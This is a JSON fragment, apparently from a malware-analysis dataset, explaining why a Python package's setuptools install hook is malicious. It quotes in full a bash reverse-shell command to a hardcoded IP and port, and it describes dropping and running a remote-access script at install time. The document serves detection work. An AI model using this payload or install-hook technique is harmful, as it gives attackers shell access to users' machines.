      "malicious_behavior": "This code is clearly malicious. It abuses the setuptools install hook to execute arbitrary code during package installation, a hallmark of supply chain attacks. Specifically, it writes a Python file ('remote-access.py') containing a reverse shell payload (os.system(\"bash -i >& /dev/tcp/10.3.0.95/4444 0>&1\")), moves it to the user's home directory, and then executes it using subprocess.Popen. The reverse shell command connects to a hardcoded external IP address (10.3.0.95) on port 4444, giving an attacker remote shell access to the victim's machine. There is no user notification, consent, or legitimate business logic for this behavior. The use of try/except to suppress errors further indicates an attempt to evade detection. All of these patterns are strongly associated with malware and supply chain attacks, and are never seen in benign software.",
